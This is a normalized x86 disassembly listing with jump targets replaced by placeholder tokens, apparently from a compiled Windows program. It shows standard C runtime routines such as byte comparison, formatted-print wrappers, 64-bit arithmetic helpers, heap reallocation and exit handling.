movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
test eax eax
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x7 ]
movzx esi [ eax - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0xc ]
movzx ebx [ ecx + 0xc ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xa ]
movzx ebx [ ecx + 0xa ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
mov esi [ eax + 0x10 ]
cmp esi [ ecx + 0x10 ]
je r-xdata
movzx esi [ eax + 0xd ]
movzx ebx [ ecx + 0xd ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0xb ]
movzx ebx [ ecx + 0xb ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx ebx [ ecx + 0x10 ]
movzx esi [ eax + 0x10 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xe ]
movzx ebx [ ecx + 0xe ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x14 ]
cmp esi [ ecx + 0x14 ]
je r-xdata
movzx esi [ eax + 0x11 ]
movzx ebx [ ecx + 0x11 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0xf ]
movzx ebx [ ecx + 0xf ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x14 ]
movzx ebx [ ecx + 0x14 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x12 ]
movzx ebx [ ecx + 0x12 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x18 ]
cmp esi [ ecx + 0x18 ]
je r-xdata
movzx esi [ eax + 0x15 ]
movzx ebx [ ecx + 0x15 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x13 ]
movzx ebx [ ecx + 0x13 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x18 ]
movzx ebx [ ecx + 0x18 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x16 ]
movzx ebx [ ecx + 0x16 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x1c ]
cmp esi [ ecx + 0x1c ]
je r-xdata
movzx esi [ eax + 0x19 ]
movzx ebx [ ecx + 0x19 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x17 ]
movzx ebx [ ecx + 0x17 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x1c ]
movzx ebx [ ecx + 0x1c ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x1a ]
movzx ebx [ ecx + 0x1a ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
add eax edx
add ecx edx
sub edi edx
movzx esi [ eax + 0x1d ]
movzx ebx [ ecx + 0x1d ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x1b ]
movzx ebx [ ecx + 0x1b ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x1e ]
movzx ebx [ ecx + 0x1e ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
movzx esi [ eax + 0x1f ]
movzx ebx [ ecx + 0x1f ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
sub_417b90
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push esi
xor esi esi
cmp [ ebp + 0xc ] esi
jne r-xdata
push [ ebp + 0x14 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
mov [ ebp - 0x1c ] 0x7fffffff
push [ ebp + 0xc ]
mov [ ebp - 0x14 ] 0x42
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
call [ ebp + 0x8 ]
add esp 0x10
call sub_4162ac
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_4153b1
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop esi
leave
retn
sub_417c03
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
cmp edi ebx
je r-xdata
call sub_4162ac
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_4153b1
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp edi 0x3fffffff
jbe r-xdata
cmp esi ebx
jne r-xdata
pop ebx
leave
retn
lea eax [ edi + edi ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_4162ac
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_4153b1
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
cmp eax ebx
jl r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi * 2 - 0x2 ] ax
setge al
dec eax
dec eax
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_41c4ef
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
inc [ ebp - 0x20 ]
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_41c4ef
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_417cfb
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x10 ] esi
jne r-xdata
push edi
mov edi [ ebp + 0x8 ]
cmp edi esi
je r-xdata
call sub_4162ac
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_4153b1
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_4162ac
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] esi
ja r-xdata
pop esi
pop ebp
retn
push esi
push esi
push esi
push esi
push esi
call sub_4153b1
add esp 0x14
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push sub_41d31a
call sub_417c03
add esp 0x18
cmp eax esi
jge r-xdata
cmp eax 0xfffffffe
jne r-xdata
xor ecx ecx
mov [ edi ] cx
pop edi
call sub_4162ac
mov [ eax ] 0x22
sub_417e30
cmp [ rw-data ] 0x0
je r-xdata
push ebp
mov ebp esp
sub esp 0x20
and esp 0xfffffff0
fld st0
fst [ esp + 0x18 ]
fistp [ esp + 0x10 ]
fild [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff8
fstp [ esp ]
cvttsd2si eax [ esp ]
leave
retn
mov edx [ esp + 0x14 ]
test edx 0x7fffffff
jne r-xdata
fsubp st1
test edx edx
jns r-xdata
fstp [ esp + 0x18 ]
fstp [ esp + 0x18 ]
fstp [ esp ]
mov ecx [ esp ]
add ecx 0x7fffffff
sbb eax 0x0
mov edx [ esp + 0x14 ]
sbb edx 0x0
jmp r-xdata
fstp [ esp ]
mov ecx [ esp ]
xor ecx 0x80000000
add ecx 0x7fffffff
adc eax 0x0
mov edx [ esp + 0x14 ]
adc edx 0x0
jmp r-xdata
leave
retn
sub_417ee0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_417f20
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_417fca
push 0x10
push r--data
call sub_415ff4
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_4162ac
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_4153b1
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x4
call sub_419057
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_41908a
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
call sub_416039
retn
mov esi [ ebp - 0x1c ]
mov esi [ ebx - 0x4 ]
sub esi 0x9
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_418064
cmp [ ebp - 0x20 ] edi
jne r-xdata
sub_41806d
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
jmp r-xdata
movzx ecx [ esi ]
movzx eax [ edx ]
movzx edi cx
sub eax edi
je r-xdata
test cx cx
je r-xdata
pop edi
pop esi
test eax eax
jge r-xdata
inc edx
inc edx
inc esi
inc esi
jle r-xdata
or eax 0xffffffff
pop ebp
retn
pop ebp
retn
xor eax eax
inc eax
sub_4180a4
mov edi edi
push ebp
mov ebp esp
push ecx
or [ ebp - 0x4 ] 0xffffffff
cmp [ rw-data ] 0x0
jne r-xdata
call sub_419de3
mov ecx [ rw-data ]
cmp ecx eax
je r-xdata
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
xor eax eax
leave
retn
push 0x0
push 0x4
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push [ rw-data ]
push ecx
call sub_419dec
pop ecx
call eax
test eax eax
je r-xdata
mov [ rw-data ] 0x1
push r--data
push eax
call [ GetProcAddress@IAT ]
push eax
call sub_419d71
pop ecx
mov [ rw-data ] eax
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
xor eax eax
inc eax
leave
retn
sub_418123
push 0x10
push r--data
call sub_415ff4
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
mov esi [ ebp + 0xc ]
cmp esi 0xffffffe0
jbe r-xdata
call sub_4162ac
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_4153b1
add esp 0x14
cmp [ rw-data ] 0x3
jne r-xdata
call sub_4162ac
mov [ eax ] 0xc
jmp r-xdata
call sub_416039
retn
cmp esi edi
jne r-xdata
push 0x4
call sub_419057
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_41908a
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
push [ rw-data ]
call [ HeapSize@IAT ]
mov edi eax
push esi
push ebx
push 0x10
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov [ ebp - 0x1c ] eax
test eax eax
jne r-xdata
xor esi esi
inc esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_418212
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov [ ebp - 0x1c ] edi
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp - 0x1c ]
cmp edi 0x4000
ja r-xdata
cmp esi edi
jne r-xdata
push esi
push ebx
push eax
call sub_419588
add esp 0xc
test eax eax
je r-xdata
call sub_4162ac
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_41626a
mov [ esi ] eax
pop ecx
cmp esi edi
ja r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push ebx
push 0x10
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
jne r-xdata
xor esi esi
inc esi
mov [ ebp - 0x1c ] ebx
call sub_4180a4
test eax eax
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
sub_418263
mov edi edi
push ebp
mov ebp esp
push edi
mov edi 0x3e8
pop edi
pop ebp
retn
test eax eax
je r-xdata
push edi
call [ Sleep@IAT ]
push [ ebp + 0x8 ]
call [ GetModuleHandleW@IAT ]
add edi 0x3e8
cmp edi 0xea60
ja r-xdata
sub_418293
mov edi edi
push ebp
mov ebp esp
call sub_419cf9
push [ ebp + 0x8 ]
call sub_419b4e
push [ rw-data ]
call sub_419dec
push 0xff
call eax
add esp 0xc
pop ebp
retn
sub_4182bc
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_418311
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_41832e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_418352
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_41ea30
push r--data
push r--data
call sub_41832e
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_41a7c0
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push sub_41b1f1
call sub_415f3a
mov eax r--data
mov [ esp ] r--data
call sub_418311
cmp [ rw-data ] 0x0
pop ecx
je r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
xor eax eax
push rw-data
call sub_41a7c0
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_4183d7
push 0x18
push r--data
call sub_415ff4
push 0x8
call sub_419057
pop ecx
and [ ebp - 0x4 ] 0x0
xor ebx ebx
inc ebx
cmp [ rw-data ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4184ee
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_416039
retn
mov [ rw-data ] ebx
push 0x8
call sub_418f7d
pop ecx
push [ ebp + 0x8 ]
call sub_4182e7
push r--data
mov eax r--data
call sub_418311
pop ecx
push [ rw-data ]
call sub_419dec
pop ecx
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
je r-xdata
push r--data
mov eax r--data
call sub_418311
pop ecx
push [ rw-data ]
call sub_419dec
pop ecx
mov esi eax
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] esi
call sub_419de3
cmp [ esi ] eax
je r-xdata
sub esi 0x4
mov [ ebp - 0x24 ] esi
cmp esi edi
jb r-xdata
cmp esi edi
jb r-xdata
push [ esi ]
call sub_419dec
mov edi eax
call sub_419de3
mov [ esi ] eax
call edi
push [ rw-data ]
call sub_419dec
mov edi eax
push [ rw-data ]
call sub_419dec
add esp 0xc
cmp [ ebp - 0x1c ] edi
jne r-xdata
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x20 ] eax
mov esi eax
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x20 ] eax
je r-xdata
mov edi [ ebp - 0x28 ]
jmp r-xdata
sub_41854d
mov edi edi
push esi
call sub_419de3
mov esi eax
push esi
call sub_419d32
push esi
call sub_41ed04
push esi
call sub_41527a
push esi
call sub_41c2a4
push esi
call sub_41ecf5
push esi
